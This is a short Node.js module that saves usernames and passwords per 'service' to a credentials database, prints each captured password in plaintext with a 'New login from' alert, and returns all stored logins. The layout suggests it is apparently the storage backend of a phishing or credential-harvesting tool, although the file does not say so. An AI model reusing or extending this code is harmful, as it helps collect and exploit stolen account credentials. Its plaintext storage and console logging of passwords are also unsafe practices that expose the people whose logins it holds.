const chalk = require('chalk');

const index = require('../index');
const driver = require('./driver');

/**
 * Saves a new login for a specific service
 * @param {String} serviceName 
 * @param {String} username 
 * @param {String} password 
 */
exports.saveNewLogin = (serviceName, username, password) => {
    if (index.usingDatabase) {
        let newLogin = new driver.getModels().Creds({
            username: username,
            password: password,
            service: serviceName,
            date: new Date().toDateString()
        });
        newLogin.save();
    }
    console.info(`${chalk.blue(`[!${chalk.red('==')}!]`)} New login from ${chalk.green(serviceName)} - Username: ${chalk.red(username)} Password: ${chalk.red(password)}`);
};

/**
 * Returns the list of logins for a specific service
 * @returns List of logins
 */
exports.fetchLogins = async () => {
    try {
        let logins = await driver.getModels().Creds.find({});
        return logins || [];
    } catch (err) {
        console.error(`Unable to fetch logins, Error: ${err.stack}`);
    }
};
